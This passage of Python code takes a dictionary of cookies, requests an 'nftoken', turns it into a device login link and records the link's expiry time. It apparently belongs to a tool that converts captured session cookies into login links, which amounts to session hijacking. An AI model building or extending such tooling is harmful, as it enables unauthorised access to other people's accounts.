    nftoken, expires = create_nftoken(cookies_dict, attempts=3)
    if not nftoken:
        return None, info_dict

    link = build_login_link(nftoken, device)
    if expires:
        try:
            expiry_dt = datetime.fromtimestamp(expires)
            info_dict["expires_at"] = expiry_dt.strftime("%Y-%m-%d %I:%M:%S %p")
        except:
            info_dict["expires_at"] = str(expires)
    else:
        info_dict["expires_at"] = "N/A"
    return link, info_dict
